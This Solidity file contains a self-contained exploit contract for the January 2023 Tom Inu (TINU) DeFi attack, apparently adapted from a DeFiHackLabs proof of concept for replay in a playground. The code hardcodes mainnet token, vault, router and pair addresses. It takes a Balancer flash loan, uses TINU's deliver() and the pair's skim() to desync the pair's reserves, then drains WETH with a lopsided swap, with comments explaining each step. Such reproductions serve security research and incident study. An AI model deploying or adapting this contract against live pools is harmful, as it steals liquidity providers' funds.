// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

// Synthetic standalone exploit for the EVM Playground (2023-01-TINU).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (TomInuExploit IS the Test; the Balancer flash-loan callback
// `receiveFlashLoan` lives on the test itself), so there is no standalone
// contract to deploy. This contract is a faithful, self-contained copy of
// that inline attack (testHack -> run, receiveFlashLoan unchanged) so the
// playground can deploy it and record run(). Logic and constants are
// copied verbatim from test/TINU_exp.sol.
//
// Root cause: same bug class as 2023-01-BEVO. TINU is a reflect-style
// token whose `deliver()` redistributes the caller's own balance to all
// holders via a reflection mechanism, bypassing transfer() entirely. This
// leaves the TINU-WETH PancakePair-style pair's cached reserves stale
// relative to its real token balance. A follow-up `skim()` pays out the
// now-understated surplus for free, a second `deliver()` widens the
// desync further, and a final lopsided `swap()` drains real WETH out of
// the pair -- netting ~22 WETH profit from a single Balancer flash loan.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface reflectiveERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function deliver(uint256 tAmount) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    function balanceOf(address) external view returns (uint256);
    function skim(address to) external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}

contract TINUDrain {
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    reflectiveERC20 private constant TINU = reflectiveERC20(0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F);

    IBalancerVault private constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IRouter private constant router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Pair private constant TINU_WETH = IUniswapV2Pair(0xb835752Feb00c278484c464b697e03b03C53E11B);

    // step 0: flashloan WETH from Balancer; receiveFlashLoan does the drain.
    function run() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 104.85 ether;

        balancerVault.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        reflectiveERC20[] memory, /*tokens*/
        uint256[] memory amounts,
        uint256[] memory, /*feeAmounts*/
        bytes memory /*userData*/
    ) external {
        // step 1: swap the flash-loaned WETH for TINU, giving the pair large fees.
        WETH.approve(address(router), type(uint256).max);
        TINU.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(TINU);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            104.85 ether, 0, path, address(this), type(uint256).max
        );

        // step 2: deliver() redistributes our TINU balance to all holders via the
        // reflection mechanism (not transfer()), leaving the pair's cached
        // reserve stale relative to its true balance.
        TINU.deliver(TINU.balanceOf(address(this))); // give away TINU

        // step 3: skim() pays out the pair's balance in excess of its reserves --
        // the staleness from deliver() lets us pull real TINU out for free.
        TINU_WETH.skim(address(this));

        // step 4: deliver() again to widen the desync ahead of the final swap.
        TINU.deliver(TINU.balanceOf(address(this)));
        // WETH in Pair always = 126

        // step 5: a final lopsided swap sized against the pair's stale reserves
        // drains real WETH out of the pair.
        TINU_WETH.swap(0, WETH.balanceOf(address(TINU_WETH)) - 0.01 ether, address(this), "");

        // step 6: repay the flash loan; whatever WETH remains is the profit.
        WETH.transfer(address(balancerVault), amounts[0]);
    }
}
